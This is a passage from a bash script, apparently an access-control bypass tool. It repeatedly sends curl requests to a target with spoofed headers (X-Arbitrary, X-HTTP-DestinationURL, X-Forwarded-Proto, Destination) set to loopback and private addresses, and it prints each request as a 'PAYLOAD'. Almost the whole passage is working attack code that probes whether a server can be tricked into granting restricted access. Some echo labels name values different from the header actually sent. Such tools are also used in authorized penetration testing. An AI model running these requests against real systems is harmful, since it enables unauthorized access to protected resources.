	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: *// Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: 8.8.8.8// Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: null// Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: 192.168.0.2// Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: 10.0.0.1// Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: 0.0.0.0// Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: localhost// Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Arbitrary http: 192.168.1.1// Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Arbitrary: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-HTTP-DestinationURL http: ${website_ip}// Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: 127.0.0.1// Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: *// Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: 8.8.8.8// Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: null// Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: 192.168.0.2// Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: 10.0.0.1// Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: 0.0.0.0// Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: localhost// Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-HTTP-DestinationURL http: 192.168.1.1// Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-HTTP-DestinationURL: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "X-Forwarded-Proto http: ${website_ip}// Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: 127.0.0.1// Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: *// Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: 8.8.8.8// Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: null// Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: 192.168.0.2// Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: 10.0.0.1// Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: 0.0.0.0// Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: localhost// Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Forwarded-Proto http: 192.168.1.1// Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${domain}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Forwarded-Proto: http://${domain}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "Destination Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: ${website_ip}, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: ${website_ip}, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: *, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: *, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 8.8.8.8, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: 8.8.8.8, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: null, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: null, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 192.168.0.2, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: 192.168.0.2, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 10.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: 10.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 0.0.0.0, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Destination: 0.0.0.0, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Destination Payload: localhost"
